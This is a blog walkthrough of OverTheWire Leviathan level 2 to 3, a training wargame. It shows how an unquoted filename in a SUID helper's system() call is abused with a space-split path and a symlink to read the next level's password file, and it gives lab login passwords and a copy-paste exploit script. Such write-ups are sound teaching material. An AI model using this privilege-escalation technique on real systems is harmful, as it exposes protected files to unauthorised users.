---
layout: post-with-comments
title: "OverTheWire Leviathan Level 2 → 3 tutorial!!"
permalink: /posts/overTheWire-Leviathan-Level-2-to-3/
tags: [overthewire, leviathan, walkthrough, ctf, linux, beginner, suid, ltrace, symlink, pathname]
description: "A step by step tutorial for OverTheWire Leviathan Level 2 → 3!!"
---

<!-- Scoped styles: only affect this post -->

<style>
  .leviathan-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .leviathan-nav .nav-left,.leviathan-nav .nav-center,.leviathan-nav .nav-right{flex:1}
  .leviathan-nav .nav-left{text-align:left}
  .leviathan-nav .nav-center{text-align:center}
  .leviathan-nav .nav-right{text-align:right}
  .leviathan-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .leviathan-nav a:hover{transform:translateY(-1px)}
  .leviathan-nav .disabled{opacity:.55}
  :root[data-theme='light'] .leviathan-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="leviathan-nav" aria-label="Leviathan level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Leviathan-Level-1-to-2/' | relative_url }}">← Previous: Level 1 → 2</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/leviathan/leviathan3.html" target="_blank" rel="noopener">Official (Level 3) ↗</a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Leviathan-Level-3-to-4/' | relative_url }}">Next: Level 3 → 4 →</a>
  </div>
</nav>

---

## Login

Log in as **leviathan2** using the password from Level 1 → 2.

```bash
ssh leviathan2@leviathan.labs.overthewire.org -p 2223
# password: NsN1HwFoyN
```

> Why? Each level is a different UNIX user. To solve 2 → 3 you must be `leviathan2`.

---

## Task

There is a **SUID binary** `printfile` in `leviathan2`’s home. Use it to obtain the password for **leviathan3**.

---

## A little bit of Theory

* **SUID binaries** run with the owner’s privileges (here: `leviathan3`).
* **`ltrace`** shows library calls/arguments (e.g., `access`, `system`).
* **Path parsing gotcha:** some programs build shell commands like `"/bin/cat %s"`. If `%s` contains a **space**, the shell may split it into **two arguments**.
* **Symlinks** let you make a harmless-looking path point to a sensitive file.

**Further reading:**

* <a href="https://man7.org/linux/man-pages/man2/access.2.html" target="_blank" rel="noopener">`access(2)` — real-UID permission check</a>
* <a href="https://man7.org/linux/man-pages/man2/setreuid.2.html" target="_blank" rel="noopener">`setreuid(2)`</a>
* <a href="https://man7.org/linux/man-pages/man1/ln.1.html" target="_blank" rel="noopener">`ln` (symlinks)</a>
* <a href="https://man7.org/linux/man-pages/man1/ltrace.1.html" target="_blank" rel="noopener">`ltrace`</a>

---

## Solution

1. **Spot the SUID binary**

   ```bash
   ls -la
   ```

   Expected:

   ```
   -r-sr-x--- 1 leviathan3 leviathan2 7436 Aug 26  2019 printfile
   ```

   *Why?* We need a binary that runs as **leviathan3**.

   ![inspect]({{ '/assets/images/leviathan/level-2-to-3/inspect.jpg' | relative_url }})

2. **Try the program**

   ```bash
   ./printfile
   # then
   ./printfile .bash_logout
   # and
   ./printfile /etc/leviathan_pass/leviathan3
   ```

   Typical:

   ```
   *** File Printer ***
   Usage: ./printfile filename
   ```

   For a readable file you own:

   ```
   ./printfile .bash_logout
   # ~/.bash_logout: executed by bash(1) when login shell exits.
   ...
   ```

   Output:

   ```
   You cant have that file...
   ```

   *Why?* It prints readable files, but refuses the password file (“You cant have that file...”).

   ![usage/ok]({{ '/assets/images/leviathan/level-2-to-3/usage.jpg' | relative_url }})
   ![print]({{ '/assets/images/leviathan/level-2-to-3/print.jpg' | relative_url }})

3. **Trace to understand the checks**

   ```bash
   ltrace ./printfile .bash_logout
   ```
   
   Snippet (typical):

   ```
   access(".bash_logout", 4)                         = 0
   snprintf("/bin/cat .bash_logout", 511, "/bin/cat %s", ".bash_logout") = 21
   setreuid(12002, 12002)                            = 0
   system("/bin/cat .bash_logout")                   = 0
   ```

   *Why?* We see the order:
   `access(filename, R_OK)` **as leviathan2**, then later `setreuid(leviathan3)` and `system("/bin/cat %s")`.
   So the permission check happens **before** it becomes `leviathan3`, and then a shell command is built with **`%s`**.

   ![ltrace-ok]({{ '/assets/images/leviathan/level-2-to-3/ltrace-ok.jpg' | relative_url }})

4. **Probe with a filename that contains a space**

   ```bash
   dir=$(mktemp -d)
   touch "$dir/test file.txt"
   ltrace ./printfile "$dir/test file.txt"
   ```

   Trace shows:

   ```
   access("/tmp/.../test file.txt", 4) = 0
   system("/bin/cat /tmp/.../test file.txt")
   # cat treats these as TWO args: '/tmp/.../test' and 'file.txt'
   ```

   *Why?* `access()` sees the full path (allowed), but `/bin/cat %s` is tokenized by the shell: the first token is `…/test` and the second is `file.txt`. That split is our injection point.

   ![ltrace-space]({{ '/assets/images/leviathan/level-2-to-3/ltrace-space.jpg' | relative_url }})

5. **Exploit via a symlink named `test`**

   ```bash
   ln -s /etc/leviathan_pass/leviathan3 "$dir/test"
   chmod 777 "$dir"
   ls -la "$dir"
   ```

   *Why?* When `/bin/cat` receives the split tokens, it will read `"$dir/test"` first — our **symlink** that points at the real password file.

   ![symlink]({{ '/assets/images/leviathan/level-2-to-3/symlink.jpg' | relative_url }})

6. **Trigger the read and capture the password**

   ```bash
   ./printfile "$dir/test file.txt"
   ```

   *Why?* `/bin/cat` follows the first token `"$dir/test"` → dereferences to `/etc/leviathan_pass/leviathan3` and prints the password. It will also complain about `file.txt`, which we can ignore.

   ![decrypt]({{ '/assets/images/leviathan/level-2-to-3/decrypt.jpg' | relative_url }})

---

## Password

```
f0n8h2iWLP
```

---

## Troubleshooting

* **“You cant have that file…” immediately?** Ensure you’re calling the **spaced** name: `"$dir/test file.txt"`.
* **No output, only errors for `file.txt`?** Re-create the symlink: `ln -sf /etc/leviathan_pass/leviathan3 "$dir/test"`.
* **Permission denied on temp dir?** `chmod 777 "$dir"` so the SUID owner can traverse it.
* **Different tmp path names?** That’s fine; `mktemp -d` generates random names each time.

---

## Copy-paste quick run

```bash
ssh leviathan2@leviathan.labs.overthewire.org -p 2223
# password: NsN1HwFoyN

cd ~
ls -la                         # see SUID ./printfile
ltrace ./printfile .bash_logout

dir=$(mktemp -d)
touch "$dir/test file.txt"
ln -s /etc/leviathan_pass/leviathan3 "$dir/test"
chmod 777 "$dir"
./printfile "$dir/test file.txt"   # → f0n8h2iWLP
```

---

**Congrats 🎉** You abused **argument splitting** + **symlinks** to make a SUID helper read a protected file. On to **leviathan3**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

